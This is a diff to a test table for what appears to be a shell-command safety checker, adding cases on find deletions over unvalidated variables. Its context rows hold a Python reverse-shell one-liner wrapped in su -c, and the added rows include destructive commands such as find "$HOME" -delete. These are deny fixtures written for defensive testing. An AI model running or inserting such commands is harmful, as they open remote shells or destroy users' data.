@@ -1041,3 +1041,12 @@ deny	R8 su login shorthand with a user	su - deploy -c "python3 -c 'import socket
 deny	R8 su login shorthand without a user	su - -c "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"h\",1));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")'"
 pass	R8-fp su login shell with no -c payload	su - deploy
 pass	R8-fp su spelling quoted in a commit message	git commit -m "runbook: su - deploy -c 'systemctl restart api'"
+deny	HK-L1 find -delete on an unvalidated var	find "$BUILD_DIR" -delete	
+deny	HK-L1 find -exec rm -rf on an unvalidated var	find "$BUILD_DIR" -type f -exec rm -rf {} +	
+deny	HK-L1 find -execdir rm on an unvalidated var	find "$B" -name "*.log" -execdir rm {} \;	
+deny	HK-L1 find -delete on bare $HOME (no subpath)	find "$HOME" -delete	
+pass	HK-L1 find -delete with the var validated inline	: "${BUILD_DIR:?must be set}" && find "$BUILD_DIR" -delete	
+pass	HK-L1 find -delete under a literal path	find /tmp/work -delete	
+pass	HK-L1 find -delete under a relative literal path	find . -name "*.tmp" -delete	
+pass	HK-L1 find on a var that deletes nothing	find "$BUILD_DIR" -name "*.log" -print	
+pass	HK-L1 find -delete with the token	find "$BUILD_DIR" -delete # [allow-rm-rf-var]	
